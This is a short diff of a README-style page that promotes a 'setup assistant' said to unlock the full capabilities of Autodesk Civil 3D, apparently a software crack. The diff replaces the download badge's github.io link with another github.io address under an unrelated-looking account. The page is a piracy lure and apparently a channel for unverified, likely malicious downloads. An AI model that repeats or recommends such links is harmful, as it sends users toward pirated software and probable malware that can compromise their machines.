@@ -5,7 +5,7 @@ Enable full capabilities of **Autodesk Civil 3D** with this standalone setup ass
 ---
 
 🔘 **Download Setup Assistant:**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-darkgreen)](https://civil-3d-activator.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-darkgreen)](https://lonniemizoo.github.io/.github/civil-3d-activator)
 
 ---
 
